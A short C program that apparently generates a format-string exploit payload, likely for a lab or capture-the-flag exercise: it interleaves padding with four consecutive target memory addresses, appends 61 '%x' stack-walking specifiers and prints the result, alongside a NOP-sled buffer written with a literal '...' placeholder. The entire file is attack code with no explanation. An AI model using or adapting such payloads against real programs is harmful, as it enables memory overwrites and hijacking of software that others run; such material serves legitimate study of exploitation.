#include<stdio.h>
#include<string.h>


int main(){

    int i;

  unsigned char exploit[1024] = "\x90\x90\x90...\x90";
  char format[1024];

  strcpy(format, "\xaa\xaa\xaa\xaa");
  strcat(format, "\xdc\xf5\x42\x01");
  strcat(format, "\xaa\xaa\xaa\xaa");
  strcat(format, "\xdd\xf5\x42\x01");
  strcat(format, "\xaa\xaa\xaa\xaa");
  strcat(format, "\xde\xf5\x42\x01");
  strcat(format, "\xaa\xaa\xaa\xaa");
  strcat(format, "\xdf\xf5\x42\x01");

  for (i=0; i < 61; i++) {
    strcat(format, "%x");
  }

  puts(format);

}